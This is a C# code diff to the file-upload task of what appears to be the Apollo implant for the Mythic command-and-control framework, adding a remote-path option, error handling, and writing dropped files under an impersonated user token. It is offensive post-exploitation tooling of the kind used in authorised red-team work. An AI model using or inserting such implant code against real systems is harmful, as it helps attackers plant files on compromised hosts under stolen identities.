@@ -9,6 +9,7 @@ using System.Runtime.Serialization;
 using ApolloInterop.Serializers;
 using System.Threading;
 using System.IO;
+using System.Security.Principal;
 
 namespace Tasks
 {
@@ -59,12 +60,15 @@ namespace Tasks
                     });
                 } else
                 {
-                    path = Path.Combine(new string[]
-                    {
-                        Directory.GetCurrentDirectory(),
-                        p.FileName
-                    });
+                    path = p.RemotePath;
                 }
+            } else
+            {
+                path = Path.Combine(new string[]
+                {
+                    Directory.GetCurrentDirectory(),
+                    p.FileName
+                });
             }
 
             if (!string.IsNullOrEmpty(host))
@@ -90,24 +94,33 @@ namespace Tasks
                     out byte[] fileData))
                 {
                     string path = ParsePath(parameters);
-                    File.WriteAllBytes(path, fileData);
-                    resp = CreateTaskResponse(
-                        $"Uploaded {fileData.Length} bytes to {path}",
-                        true,
-                        "completed",
-                        new IMythicMessage[]
+                    try
+                    {
+                        using (_agent.GetIdentityManager().GetCurrentImpersonationIdentity().Impersonate())
                         {
-                            new UploadMessage()
+                            File.WriteAllBytes(path, fileData);
+                        }
+                        resp = CreateTaskResponse(
+                            $"Uploaded {fileData.Length} bytes to {path}",
+                            true,
+                            "completed",
+                            new IMythicMessage[]
                             {
-                                FileID = parameters.FileID,
-                                FullPath = path
-                            },
-                            new Artifact()
-                            {
-                                BaseArtifact = "FileCreate",
-                                ArtifactDetails = $"Wrote {fileData.Length} to {path}"
-                            }
-                        });
+                                new UploadMessage()
+                                {
+                                    FileID = parameters.FileID,
+                                    FullPath = path
+                                },
+                                new Artifact()
+                                {
+                                    BaseArtifact = "FileCreate",
+                                    ArtifactDetails = $"Wrote {fileData.Length} to {path}"
+                                }
+                            });
+                    } catch (Exception ex)
+                    {
+                        resp = CreateTaskResponse($"Failed to upload file: {ex.Message}", true, "error");
+                    }
                 } else
                 {
                     if (_cancellationToken.IsCancellationRequested)
